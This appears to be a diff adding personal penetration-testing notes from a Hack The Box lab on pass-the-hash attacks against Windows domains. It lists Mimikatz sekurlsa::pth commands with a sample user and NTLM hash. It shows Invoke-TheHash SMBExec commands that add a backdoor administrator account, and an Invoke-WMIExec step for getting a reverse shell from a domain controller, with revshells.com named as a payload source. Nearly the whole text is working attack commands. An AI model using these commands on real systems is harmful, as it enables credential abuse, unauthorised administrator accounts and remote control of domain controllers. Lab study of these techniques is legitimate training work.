@@ -1,0 +1,18 @@
+We can pass the hash of the password if we are not able to crack it or just pass the hash.
+
+Option 1) We can use "Mimikatz" for this 
+        # c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+        # c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<HASH> /domain:<Domain> /run:cmd.exe" exit
+
+Option 2) We can user Powershell to pass the hash. 
+      Step 1) PS c:\htb> cd C:\tools\Invoke-TheHash\
+      Step 2) PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+      Step 3) PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target <IP Adress> -Domain <Domain> -Username <username> -Hash <HASH> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
+
+Note :- We can also use this to get the reverse shell from DC 
+
+Step 1) PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+
+Step 2) PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target <IP Address of DC> -Domain <Domain> -Username <Username> -Hash <HASH> -Command "<Revers shell Powershell command>"
+        We can generate the PowerShell command from URL "https://www.revshells.com/" 
